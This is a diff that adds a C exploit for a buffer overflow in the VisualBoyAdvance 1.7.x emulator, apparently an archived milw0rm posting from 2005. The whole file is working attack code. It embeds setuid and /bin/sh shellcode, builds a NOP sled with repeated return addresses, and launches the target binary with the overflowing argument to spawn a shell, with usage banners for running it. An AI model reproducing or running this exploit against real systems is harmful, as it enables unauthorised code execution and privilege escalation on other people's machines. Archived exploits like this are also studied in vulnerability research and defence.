@@ -1,0 +1,72 @@
+/*
+VisualBoyAdvanced 1.7.x BufferOver Flow exploit
+VBA - WEBSITE : vba.ngemu.com
+Found & coded by Qnix - Qnix[at]bsdmail[dot]org
+*/
+
+#include <stdlib.h>
+
+char shellcode[] =
+       "\x31\xc0\x31\xdb\xb0\x17\xcd\x80" /* setuid() */
+       "\xeb\x5a\x5e\x31\xc0\x88\x46\x07\x31\xc0\x31\xdb\xb0\x27\xcd"
+       "\x80\x85\xc0\x78\x32\x31\xc0\x31\xdb\x66\xb8\x10\x01\xcd\x80"
+       "\x85\xc0\x75\x0f\x31\xc0\x31\xdb\x50\x8d\x5e\x05\x53\x56\xb0"
+       "\x3b\x50\xcd\x80\x31\xc0\x8d\x1e\x89\x5e\x08\x89\x46\x0c\x50"
+       "\x8d\x4e\x08\x51\x56\xb0\x3b\x50\xcd\x80\x31\xc0\x8d\x1e\x89"
+       "\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
+       "\xcd\x80\xe8\xa1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
+
+
+unsigned long sp(void)
+{ __asm__("movl %esp, %eax");}
+
+int main(int argc, char *argv[])
+{
+  int i, offset;
+  long esp, ret, *addr_ptr;
+  char *buffer, *ptr;
+
+  offset = 0;
+  esp = sp();
+  ret = esp - offset;
+
+if (argc >= 2) {
+printf("\n ************************************************ \n");
+printf(" VisualBoyAdvanced 1.7.x BufferOver Flow exploit \n");
+printf("            by Qnix[at]bsdmail[dot]org      ");
+printf("\n ************************************************ \n\n");
+printf("[~] Stack pointer (ESP) : 0x%x\n", esp);
+printf("[~] Offset from ESP     : 0x%x\n", offset);
+printf("[~] Desired Return Addr : 0x%x\n\n", ret);
+} else {
+printf("\n ************************************************ \n");
+printf(" VisualBoyAdvanced 1.7.x BufferOver Flow Exploit \n");
+printf("            by Qnix[at]bsdmail[dot]org      ");
+printf("\n ************************************************ \n\n");
+printf("useage : ./vba-exp <VisualBoyAdvanced File> \n\n");
+}
+
+buffer = malloc(2300);
+
+ptr = buffer;
+addr_ptr = (long *) ptr;
+for(i=0; i < 2300; i+=4)
+{ *(addr_ptr++) = ret; }
+
+for(i=0; i < 1900; i++)
+{ buffer[i] = '\x90'; }
+
+ptr = buffer + 1900;
+for(i=0; i < strlen(shellcode); i++)
+{ *(ptr++) = shellcode[i]; }
+
+buffer[2300-1] = 0;
+
+execl(argv[1],"VisualBoyAdvance",buffer,0);
+
+free(buffer);
+
+  return 0;
+}
+
+// milw0rm.com [2005-09-13]
